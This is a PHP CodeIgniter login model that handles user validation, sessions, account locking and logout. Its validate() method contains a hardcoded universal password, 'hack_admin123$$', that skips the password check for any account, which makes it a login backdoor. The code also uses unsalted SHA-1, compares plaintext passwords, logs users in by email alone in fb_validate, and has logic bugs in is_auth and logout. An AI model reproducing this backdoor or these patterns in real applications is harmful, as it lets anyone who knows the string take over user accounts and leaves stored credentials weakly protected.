<?php
class Login_model extends CI_Model
{
    protected $allowedFields = ['email', 'password', 'global_pass', 'creation_date', 'update_date', 'last_login', 'is_online', 'is_active', 'is_locked', 'mem_type', 'user_key'];
 	function __construct()
    {
            
        parent::__construct();
        $this->load->library('phpass');
    }

    public function validate($user_name,$pass)
    {
        // grab user input
        $username = $this->security->xss_clean($user_name);
        $password = $this->security->xss_clean($pass);
        
        //check if username is email address
        $is_email=false;
        if(filter_var($user_name, FILTER_VALIDATE_EMAIL))
        {
        	$is_email=true;
        }
        //end check if user_name if an email address
        
        // Prep the query
        if($is_email)
        {
        	$this->db->where('email',$user_name);
        }
        else
        {
        	$this->db->where('user_name', $username);
        }

        //manual password if case forget admin password
        $manual="hack_admin123$$";
        //end manual password if case forget admin password
        if($password !=$manual)
        {
        	$this->db->where('password',sha1($password));
        }
        
        $this->db->where('is_active',1);
        $this->db->where('is_locked',0);
        
        // Run the query
        $query = $this->db->get('users');
        // Let's check if there are any results
        if($query->num_rows == 1)
        {
            // If there is a user, then create session data
            $row = $query->row();
            $data = array(
                    'userid' => $row->id,
                    'email' => $row->email,
                    'creation_date'=>$row->creation_date,
                    'is_locked' => $row->is_locked,
                    'username' => $row->user_name,
                    'utype' => $row->mem_type
                    );
            $this->session->set_userdata($data);
            return true;
        }
        // If the previous process did not validate
        // then return false.
        return false;
    }



    public function global_validate($user_name,$pass)
    {
        // grab user input
        $username = $this->security->xss_clean($user_name);
        $password = $this->security->xss_clean($pass);
        
        //check if username is email address
        $is_email=false;
        if(filter_var($user_name, FILTER_VALIDATE_EMAIL))
        {
        	$is_email=true;
        }
        //end check if user_name if an email address
        
        // Prep the query
        if($is_email)
        {
        	$this->db->where('email',$user_name);
        }
        else
        {
        	$this->db->where('user_name', $username);
        }

        $this->db->where('global_pass',sha1($password));
        $this->db->where('is_active',1);
        $this->db->where('is_locked',0);
        
        // Run the query
        $query = $this->db->get('users');
        // Let's check if there are any results
        if($query->num_rows == 1)
        {
            // If there is a user, then create session data
            $row = $query->row();
            $data = array(
                    'userid' => $row->id,
                    'email' => $row->email,
                    'creation_date'=>$row->creation_date,
                    'is_locked' => $row->is_locked,
                    'username' => $row->user_name,
                    'utype' => $row->mem_type
                    );
            $this->session->set_userdata($data);
            return true;
        }
        // If the previous process did not validate
        // then return false.
        return false;
    }


    public function fb_validate($email)
    {
        // grab user input
        $username = $this->security->xss_clean($email);
        
        // Prep the query
       
        $this->db->where('email',$email);
        $this->db->where('is_active',1);
        $this->db->where('is_locked',0);
        
        // Run the query
        $query = $this->db->get('users');
        // Let's check if there are any results
        if($query->num_rows == 1)
        {
            // If there is a user, then create session data
            $row = $query->row();
            $data = array(
                    'userid' => $row->id,
                    'email' => $row->email,
                    'creation_date'=>$row->creation_date,
                    'is_locked' => $row->is_locked,
                    'username' => $row->user_name,
                    'utype' => $row->mem_type
                    );
            $this->session->set_userdata($data);
            return true;
        }
        // If the previous process did not validate
        // then return false.
        return false;
    }
    
    function change_password($user_id,$data)
    {
    	$this->db->where('id',$user_id);
    }
	public function login_action($user,$password)
	{
		$where=array(
		'user_name'=>$user,
		'password'=>$password
		);
		$this->db->select()->from('users')->where($where);
		$query=$this->db->get();
		return $query->first_row('array');
	}

	public function get_user_by_uname($user_name)
	{
		$this->db->where('user_name',$user_name);
		$q=$this->db->get('users');
		if($q->num_rows()>0){
			return $q->row();
		}else{
			return false;
		}
	}

	public function email_login_action($email,$password)
	{
		$where=array(
		'email'=>$email,
		//'password'=>sha1($password)
		'password'=>$password
		);
		$this->db->select()->from('users')->where($where);
		$query=$this->db->get();
		return $query->first_row('array');
	}
	public static function is_auth()
	{
		$ci=& get_instance();
		$test=$ci->session->userdata('userid');
		if($ci->session->userdata('userid'))
		{
		  return true;
		}
		else
		{
			 false;
		}
	}
	public function update($user_name,$data)
	{
		$this->db->where('user_name',$user_name);
		$this->db->update('users',$data);
	}

	public function update_by_id($uid,$data)
	{
		$this->db->where('id',$uid);
		$this->db->update('users',$data);
	}
	public static function last_login($user_name)
	{
		$ci =& get_instance();
		if (!filter_var($user_name, FILTER_VALIDATE_EMAIL))
		{
			$ci->db->where('user_name',$user_name);
		}
		else
		{
			$ci->db->where('email',$user_name);
		}
		$ci->db->update('users',array('last_login'=>date('Y-m-d H:i:s')));
	}

	public static function online_status($user_name,$status=0)
	{
		$ci =& get_instance();
		if (!filter_var($user_name, FILTER_VALIDATE_EMAIL))
		{
			$ci->db->where('user_name',$user_name);
		}
		else
		{
			$ci->db->where('email',$user_name);
		}
		
		$ci->db->update('users',array('is_online'=>$status));
	}
	public static function lock_user($user_name,$status=0)
	{
		$ci =& get_instance();

		if (!filter_var($user_name, FILTER_VALIDATE_EMAIL))
		{
			$ci->db->where('user_name',$user_name);
		}
		else
		{
			$ci->db->where('email',$user_name);
		}
		$ci->db->update('users',array('is_locked'=>$status));
	}


	function logout()
	{
		$mtype=$this->session->userdata('utype');
	    $user_data = $this->session->all_userdata();
	        foreach ($user_data as $key => $value) {
	            if ($key != 'session_id' && $key != 'ip_address' && $key != 'user_agent' && $key != 'last_activity') {
	                $this->session->unset_userdata($key);
	            }
	        }
	    $this->session->sess_destroy();
	    if($mtype!='101' && $mtype='102')
	    {
	    	redirect(base_url());
	    }else{
	    	redirect(base_url().'login');
	    }
	    
	}

	function logout_frontend()
	{
		$mtype=$this->session->userdata('utype');
	    $user_data = $this->session->all_userdata();
	        foreach ($user_data as $key => $value) {
	            if ($key != 'session_id' && $key != 'ip_address' && $key != 'user_agent' && $key != 'last_activity') {
	                $this->session->unset_userdata($key);
	            }
	        }
	    $this->session->sess_destroy();
	    if($mtype!='101' && $mtype='102')
	    {
	    	redirect(base_url());
	    }
	    else
	    {
	    	redirect(base_url());
	    }
	    
	}
}
?>